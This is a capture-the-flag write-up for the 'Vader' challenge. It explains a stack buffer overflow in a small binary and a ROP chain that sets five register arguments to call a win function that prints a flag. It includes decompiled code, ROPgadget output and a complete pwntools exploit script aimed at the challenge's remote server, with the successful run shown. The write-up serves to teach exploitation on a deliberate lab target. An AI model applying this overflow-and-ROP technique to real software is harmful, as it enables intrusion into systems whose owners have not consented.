# Vader

The description for this challenge was as follows:

*Submit flag from /flag.txt from 0.cloud.chals.io:20712*

This was a relatively simple binary exploitation challenge, and it was only worth 100 points by the end of the competition. Nevertheless, it seems like a nice learning exercise for anyone new to ROP.

**TL;DR Solution:** Note that the program includes a significant stack overflow, as well as a function that will print the flag if its parameters are set correctly. Set up a ROPchain using the various pop gadgets available in the binary to set those parameters, then call the function to print the flag.

## Understanding the Program:

The first step of binary exploitation is typically to run the program and try inputs that might indicate certain security issues, and that approach works well. When I run the program and enter an arbitrary long string, I trigger a segmentation fault. This indicates some sort of overflow that can potentially be exploited.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes$ ./vader
MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK
MMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3
MMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF
MMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM
MMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3
MMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM
MMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3
MMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM
MMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM
MMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM
MMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM
MMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM
MMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM
MMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM
MMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM
MMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM
MMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM
MMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM
MMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM
MMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM
MMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM
MMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM
MMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM
MMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM
MXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM
NxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW
xd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO
,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l
.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.
x,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;
MNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N
MMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM
MMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM


 When I left you, I was but the learner. Now I am the master >>> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault
```
Next, I can decompile the binary with Ghidra to get a closer look at what it's doing. In the decompilation for main, I see that fgets() is being used to read up to 0x100 bytes into a stack buffer to which 32 bytes have been allocated. This indicates that there is a serious stack overflow, which will in turn allow us to overwrite the return pointer and execute functions and gadgets of our choice.
```
undefined8 main(void)

{
  char my_input [32];
  
  print_darth();
  printf("\n\n When I left you, I was but the learner. Now I am the master >>> ");
  fgets(my_input,0x100,stdin);
  return 0;
}
```
I also see that there is something resembling a win function in vader(). This function will open and print the contents of the flag.txt file, but only if its five parameters are set to specific values:
```
void vader(char *param_1,char *param_2,char *param_3,char *param_4,char *param_5)

{
  int iVar1;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  FILE *local_10;
  
  iVar1 = strcmp(param_1,"DARK");
  if (iVar1 == 0) {
    iVar1 = strcmp(param_2,"S1D3");
    if (iVar1 == 0) {
      iVar1 = strcmp(param_3,"OF");
      if (iVar1 == 0) {
        iVar1 = strcmp(param_4,"TH3");
        if (iVar1 == 0) {
          iVar1 = strcmp(param_5,"FORC3");
          if (iVar1 == 0) {
            local_38 = 0;
            local_30 = 0;
            local_28 = 0;
            local_20 = 0;
            local_10 = (FILE *)0x0;
            local_10 = fopen("flag.txt","r");
            fgets((char *)&local_38,0x30,local_10);
            printf("<<< %s\n",&local_38);
          }
        }
      }
    }
    else {
      printf("You are a wretched thing, of weakness and fear.");
    }
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  return;
}

```
## Exploiting the Program with a ROP chain:

Most likely, you are already somewhat familiar with the ret2win binary exploitation technique, in which the address of some win function is made to overwrite the return pointer, and it is triggered when the function in which it is implemented returns. Calling a win function with specific arguments is a bit more tricky, but still doable. In essence, in much the same way as an overwrite of the return address can cause one function to be triggered, adding more functions or gadgets after that overwritten address can cause the program to execute them one after another in a chain, since each program should return back where it started, in the midst of the ROP chain.

This feature is very helpful when setting parameters for a function call in x86-64. Unlike x86 (32-bit), where arguments would simply have been placed on the stack after the function address, in x86-64, parameters are determined by values in registers. Normally, specific registers correspond with different parameters in a clear and defined manner: rdi is the first parameter, rsi is the second, rdx is the third, rcx is the fourth, and r8 is the fifth. In normal program flow, these parameters are often filled using mov instructions; for example, here is a decompiled fgets() call in the main function of vader:
```
fgets(my_input,0x100,stdin);
```
And here is the corresponding assembly code. Lines like "MOV        RDX ,qword ptr [stdin ]" move the address for stdin into rdx, which then shows up as the third parameter of the function.
```
        004015db 48  8b  15       MOV        RDX ,qword ptr [stdin ]
                 8e  3a  00  00
        004015e2 48  8d  45  e0    LEA        RAX =>my_input ,[RBP  + -0x20 ]
        004015e6 be  00  01       MOV        ESI ,0x100
                 00  00
        004015eb 48  89  c7       MOV        RDI ,RAX

```
In a ROPchain, however, we need to use small portions of instructions that already exist in the binary, followed by ret instructions (these are known as gadgets) so that after their exection, the program flow returns to the next instruction on the stack and allows us to form a chain. One of the simplest forms of gadget is the "pop register name ; ret" variety; this type of gadget will fill the register with the next 8-byte item on the stack, popping it off in the process, then return back to the chain after both the gadget and the stack item that was popped. This means that we can make a chain comprised of something like "pop rdi ; ret" "value for rdi" "pop rsi ; ret" "value for rsi", etc., ending with the desired function call.

In addition, it is relatively easy to find these types of gadgets using automated tools like ROPgadget or ropper. I normally run ROPgadget on a binary, grep for the specific gadget or at least register that I want to control, and then recording the address in a variable in my exploit code. For instance, here is how we can find a "pop rdi ; ret" gadget.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes$ ROPgadget --binary vader | grep "pop rdi"
0x000000000040165b : pop rdi ; ret
```
Sometimes, we can't find gadgets that only affect the register we're interested in. For instance, the only "pop rsi" gadget in the binary has a "pop r15" gadget between it and the ret. This is ultimately not super important, but we do need to include a second item on the stack to be popped into r15; this stack item's value is not important.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes$ ROPgadget --binary vader | grep "pop rsi"
0x0000000000401659 : pop rsi ; pop r15 ; ret
```
Sometimes, you will need to work with more exotic gadgets, but in this case, pop gadgets for all of the registers we need are available in the binary.

## Putting It All Together

At this point, we know how to control the registers whose contents will be checked over the course of the win function. The actual contents of registers needs to be addresses to the strings to which they are respectively being compared; fortunately, those strings already exist in the binary, and it is pretty easy to find them using something like Ghidra:
![image](https://user-images.githubusercontent.com/10614967/161549241-5f93f724-8565-4473-96eb-8579d58b86a3.png)
Here is what the final script looks like:
```
from pwn import *

local = 0
if local == 1:
	target = process('./vader')
    #This breaks toward the end of main. Run it locally and watch the pops and register values to get a feel for how this works.
	pid = gdb.attach(target, "\nb *0x004015f8\n set disassembly-flavor intel\ncontinue")
else:
	target = remote('0.cloud.chals.io', 20712)

elf = ELF('vader')

#Gadgets:
pop_rdi = 0x000000000040165b	
pop_rsi_r15 = 0x0000000000401659
pop_rcx_rdx = 0x00000000004011cd
pop_r8 = 0x00000000004011d9

#Strings:
DARK = 0x00402ec9
S1D3 = 0x00402ece
OF = 0x00402ed3
TH3 = 0x00402ed6
FORC3 = 0x00402eda

print(target.recvuntil(b'Now I am the master >>>'))
#I used cyclic to figure out the padding size, I did not consider the explanation super important for the write-up.
payload = cyclic(200)
padding = b'a' * 40
payload = padding
payload += p64(pop_rdi)
payload += p64(DARK)
payload += p64(pop_rsi_r15)
#I just put two copies of the S1D3 address on the stack so that the second one is popped into r15.
payload += p64(S1D3) * 2
payload += p64(pop_rcx_rdx)
#The first address goes into rcx, and the second goes into rdx.
payload += p64(TH3) + p64(OF)
payload += p64(pop_r8)
payload += p64(FORC3)
#This is just an easy way to get the addresses of named functions in pwntools.
payload += p64(elf.symbols['vader'])

target.sendline(payload)


target.interactive()
```
And here is what it looks like when the program is run against the remote server:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes$ python3 vader_exploit.py
[+] Opening connection to 0.cloud.chals.io on port 20712: Done
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes/vader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b"MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK\nMMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3\nMMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF\nMMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM\nMMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3\nMMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM\nMMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3\nMMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM\nMMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM\nMMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM\nMMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM\nMMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM\nMMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM\nMMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM\nMMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM\nMMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM\nMMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM\nMMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM\nMMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM\nMMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM\nMMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM\nMMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM\nMMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM\nMMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM\nMXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM\nNxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW\nxd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO\n,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l\n.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.\nx,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;\nMNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N\nMMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM\nMMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n\n\n When I left you, I was but the learner. Now I am the master >>>"
[*] Switching to interactive mode
 <<< shctf{th3r3-1s-n0-try}

[*] Got EOF while reading in interactive
$
```
Thaks for reading!
